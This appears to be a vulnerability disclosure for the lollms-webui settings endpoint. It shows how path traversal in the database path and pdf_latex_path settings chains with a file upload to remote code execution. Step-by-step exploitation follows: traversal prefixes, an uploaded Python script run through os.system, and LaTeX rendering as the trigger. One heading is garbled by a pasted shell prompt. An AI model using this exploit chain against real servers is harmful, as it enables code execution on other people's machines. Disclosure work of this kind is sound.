# Description

By exploiting two **Local File Inclusion**. The attacker can execute arbitrary code on targeted server. While  **Local File Inclusion** `pdf_latex_path`will leads to other severe consequences

 # Proof of Concept

## Sink

In the `http://localhost:9600/settings/`, You may set you configuration for your `ui`, there are two `paths` setting:

`**Database path:**` and `**PDF LaTeX path**` Which the former control path to conversation (sessions) storage an database location, and the latter one control the path for `PDF LaTeX`.

```python
discussion_db_name: default
pdf_latex_path: null

```

```python
@router.post("/apply_settings")
async def apply_settings(request: Request):
    """
    Endpoint to apply configuration settings.

    :param request: The HTTP request object.
    :return: A JSON response with the status of the operation.
    """

    try:
        config_data = await request.json()
        config = config_data["config"]
        try:
            for key in lollmsElfServer.config.config.keys():
                lollmsElfServer.config.config[key] = config.get(key, lollmsElfServer.config.config[key])
            ASCIIColors.success("OK")
            lollmsElfServer.rebuild_personalities()
            if lollmsElfServer.config.auto_save:
                lollmsElfServer.config.save_config()
            return {"status":True}
        except Exception as ex:
            trace_exception(ex)
            return {"status":False,"error":str(ex)}
    except Exception as ex:
        trace_exception(ex)
        lollmsElfServer.error(ex)
        return {"status":False,"error":str(ex)}
```

However, due to inefficient sanitization, both of these two key can be set with `../../../../../../../../../../` not included in the `validate_file_path(path)` . Thus we can set both of them to any directly we wanted; In this case, I am setting them both to `/home/retr0/poc/sensitive`

```shell
 ▲ ~/poc/sensitive ls -al                                                                                                                                             
total 80
drwxr-xr-x 13 retr0 retr0  4096 Mar  3 03:58 .
drwxr-xr-x  7 retr0 retr0  4096 Mar  3 02:27 ..
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 02:28 1
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 03:17 10
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 03:27 11
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 02:29 2
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 02:30 3
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 02:37 4
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 02:40 5
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 02:51 6
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 03:15 7
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 03:16 8
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 03:16 9
-rw-r--r--  1 retr0 retr0 28672 Mar  3 03:27 database.db
```

### `pdf_latex_path`

```python
def execute_latex(code, client:Client, message_id):
    def spawn_process(code):
        """Executes Python code and returns the output as JSON."""

        # Start the timer.
        start_time = time.time()

        # Create a temporary file.
        root_folder = client.discussion.discussion_folder
        root_folder.mkdir(parents=True,exist_ok=True)
        tmp_file = root_folder/f"latex_file_{message_id}.tex"
        with open(tmp_file,"w",encoding="utf8") as f:
            f.write(code)
        try:
            # Determine the pdflatex command based on the provided or default path
            if lollmsElfServer.config.pdf_latex_path:
                pdflatex_command = lollmsElfServer.config.pdf_latex_path
                print(f"Using pdflatex command: {pdflatex_command}")
            else:
                pdflatex_command = 'pdflatex'
            # Set the execution path to the folder containing the tmp_file
            execution_path = tmp_file.parent
            # Run the pdflatex command with the file path
             result = subprocess.run([pdflatex_command, "-interaction=nonstopmode", tmp_file], check=True, capture_output=True, text=True, cwd=execution_path)
            
```

`pdf_latex_path` is a config we set in the `ui` setting, by manipulating the `pdf_latex_path`, we can run arbitrary binary or file within the server.

### xxxxxxxxxx ▲ ~ lsCodeLlaMa     MLs   hacked-by-retr0reg  vulnsDownloads     Pwns  oai-chatgptGit-Projects  SDR   pocshell

```python
        self.discussion_db_name = config["discussion_db_name"]
        # Create database object
        self.db = DiscussionsDB(self.lollms_paths, self.discussion_db_name)
```

```python
# lolms-webui/lollms_core/lollms/database/discussions_database.py
class DiscussionsDB:
    
    def __init__(self, lollms_paths:LollmsPaths, discussion_db_name="default"):
        self.lollms_paths = lollms_paths
        
        self.discussion_db_name = discussion_db_name
        self.discussion_db_path = self.lollms_paths.personal_discussions_path/discussion_db_name
        ### ^PATH CONSTRUCT IS VULN^ 
```

In the other hand, controlling `discussion_db_name` variable means that we can manage to merge the whole `DiscussionsDB` (including the chat-sessions) to arbitrary location on the server. Furthermore, this directory also deal with  uploaded RAG-used file in the `chat ui`, which is stored under `{index}/text_data/<FILE>` . 

## Exploiting (PoC)

To construct this attacking method. Our goal is to first upload our *"Evil Script"* to a location. Which can be achieved by `settings -> Main configurations -> Database path` , we will use `../../../../../../../../../../../` as a prefix, then `concat` with the absolute position of targeted directory. (e.g `/tmp`: `../../../../../../../../../../../tmp`)

After that, we can see a directory looked like this:

```shell
 ▲ /tmp ls -al                                                                                                                                             
total 80
drwxr-xr-x 13 retr0 retr0  4096 Mar  3 03:58 .
drwxr-xr-x  7 retr0 retr0  4096 Mar  3 02:27 ..
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 02:28 1 #(Numbers stand for your session's index)
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 03:17 10
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 03:27 11
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 02:29 2
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 02:30 3
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 02:37 4
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 02:40 5
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 02:51 6
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 03:15 7
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 03:16 8
drwxr-xr-x  6 retr0 retr0  4096 Mar  3 03:16 9
-rw-r--r--  1 retr0 retr0 28672 Mar  3 03:27 database.db
```

### Uploading

After that, we can upload our "evil_file" in `discussion -> Send file to AI`. `LoLLMs` allowed us to upload a limit range of  files. Since this server depends on Python, we will upload a python file with `shebang`

```python
#!/usr/bin/env python3

import os
os.system('touch ./hacked-by-0reggggg-lalalalalla')
```

Now you can use `proxytools` such as `burpsuite` to check for your `discussions_id` You should see something like from `socket.io`, and that's your `discussions_id`

```
42["load_discussion",{"id":6}]
```

### Executing

Furthermore, we will need to set the `pdf_latex_path` so it points to the file that we just uploaded. For instance. if you uploaded in `tmp` and using `discussions_id: 5` ; the path to you file will be `/tmp/6/text_data/evil.py`.

We will set the `pdf_latex_path` as the same way as `discussion_db_name` ; using `../../../../../../../../../../../`. In this instance, it will be `../../../../../../../../../../../tmp/6/text_data/evil.py`

Now `pdf_latex_path=../../../../../../../../../../../tmp/6/text_data/evil.py;` `discussion_db_name=../../../../../../../../../../../tmp` we can run `execute_latex()` *(triggered when dealing with LaTex)* to execute `subprocess.run([pdflatex_command, "-interaction=nonstopmode", tmp_file], check=True, capture_output=True, text=True, cwd=execution_path)`, which will execute `subprocess.run([../../../../../../../../../../../tmp/6/text_data/evil.py, "-interaction=nonstopmode", tmp_file], check=True, capture_output=True, text=True, cwd=execution_path)` In our case, executing the *evil_file*

For example, **By simply editing any bot's answer using `LaTex`** will trigged execution of LaTeX during tests

## Further consequences within `discussion_db_name` 

However, the consequences of `discussion_db_name` didn't end. each text data storages the RAG-information that the LLM will retrieve when needed. **This can cause further file exposure** since the attacker can use techniques to manipulate or control LLM's action and response within the `lolllMs` (Users can change personality). Or attackers can use `Export Discussion`/ `Export Database` /  `Import Discussion` to read/write and etc..